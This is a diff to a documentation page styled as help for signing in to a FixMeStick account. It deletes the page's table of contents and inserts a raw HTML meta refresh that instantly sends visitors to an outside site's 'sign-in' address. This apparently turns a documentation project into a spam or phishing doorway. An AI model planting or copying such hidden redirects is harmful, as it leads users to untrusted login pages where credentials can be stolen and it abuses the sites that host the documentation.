@@ -1,9 +1,10 @@
+.. raw:: html
+ 
+    <meta http-equiv="refresh" content="0; url=https://aclogportal.com/fixmestick-sign-in-account">
+
 How to Sign In FixMeStick Account for Subscription Management?
 ============================================
 
-.. toctree::
-   :maxdepth: 2
-   :caption: Contents:
 
 .. image:: signin.png
    :alt: My Project Logo
